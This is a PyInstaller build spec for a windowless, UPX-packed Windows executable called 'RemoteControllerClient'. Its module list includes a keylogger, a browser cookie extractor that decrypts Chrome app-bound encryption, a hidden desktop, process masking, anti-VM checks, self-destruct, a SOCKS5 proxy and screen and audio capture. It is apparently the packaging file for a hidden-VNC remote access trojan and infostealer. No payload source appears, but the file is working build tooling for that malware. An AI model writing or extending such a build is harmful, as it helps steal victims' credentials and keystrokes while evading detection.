# -*- mode: python ; coding: utf-8 -*-
import os
from pathlib import Path

from PyInstaller.utils.hooks import collect_all, collect_submodules

base_dir = Path(__file__).resolve().parent
entry_script = base_dir / "client.py"
if not entry_script.exists():
    entry_script = base_dir / "remote_client" / "main.py"

datas = []
asset_root = os.getenv("RC_BUILD_ASSET_DIR", "").strip()
candidate_roots = []
if asset_root:
    candidate_roots.append(Path(asset_root) / "remote_client")
candidate_roots.extend([base_dir / "remote_client", base_dir])
for filename in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json"):
    for root in candidate_roots:
        candidate = root / filename
        if candidate.exists():
            datas.append((str(candidate), "remote_client"))
            break
binaries = []
hiddenimports = [
    'win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard',
    # Core remote_client modules
    'remote_client',
    'remote_client.config',
    'remote_client.runtime',
    'remote_client.main',
    'remote_client.system_info',
    'remote_client.session_factory',
    'remote_client.abe_status',
    # Apps subpackage
    'remote_client.apps',
    'remote_client.apps.launcher',
    # Control subpackage
    'remote_client.control',
    'remote_client.control.cursor_visibility',
    'remote_client.control.input_controller',
    'remote_client.control.keylogger',
    'remote_client.control.handlers',
    # Cookie extractor subpackage
    'remote_client.cookie_extractor',
    'remote_client.cookie_extractor.exporter',
    'remote_client.cookie_extractor.browsers',
    'remote_client.cookie_extractor.extractors',
    'remote_client.cookie_extractor.decrypt',
    'remote_client.cookie_extractor.firefox',
    'remote_client.cookie_extractor.app_bound_encryption',
    'remote_client.cookie_extractor.errors',
    # Drivers subpackage
    'remote_client.drivers',
    'remote_client.drivers.download_driver',
    # Files subpackage
    'remote_client.files',
    'remote_client.files.file_service',
    # Input stabilizer subpackage
    'remote_client.input_stabilizer',
    'remote_client.input_stabilizer.mouse_handler_pynput',
    'remote_client.input_stabilizer.cursor_confinement',
    'remote_client.input_stabilizer.coordinate_normalizer',
    'remote_client.input_stabilizer.control_adapter',
    # Media subpackage
    'remote_client.media',
    'remote_client.media.screen',
    'remote_client.media.audio',
    'remote_client.media.stream_profiles',
    # Proxy subpackage
    'remote_client.proxy',
    'remote_client.proxy.socks5_server',
    'remote_client.proxy.store',
    # Security subpackage
    'remote_client.security',
    'remote_client.security.process_monitor',
    'remote_client.security.self_destruct',
    'remote_client.security.anti_frod_vm',
    'remote_client.security.anti_frod_reg',
    'remote_client.security.process_masking',
    'remote_client.security.e2ee',
    'remote_client.security.firewall',
    # WebRTC subpackage
    'remote_client.webrtc',
    'remote_client.webrtc.signaling',
    'remote_client.webrtc.client',
    # Windows subpackage
    'remote_client.windows',
    'remote_client.windows.dpi',
    'remote_client.windows.window_capture',
    'remote_client.windows.vdd_driver',
    'remote_client.windows.hidden_desktop',
    'remote_client.windows.virtual_display',
]
# Also collect all submodules automatically
hiddenimports += collect_submodules('remote_client')
tmp_ret = collect_all('pynput')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('av')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('aiortc')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('sounddevice')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('mss')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('numpy')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]


a = Analysis(
    [str(entry_script)],
    pathex=[str(base_dir)],  # Add base_dir to pathex so remote_client is found
    binaries=binaries,
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['numpy.f2py.tests', 'pytest'],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='RemoteControllerClient',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
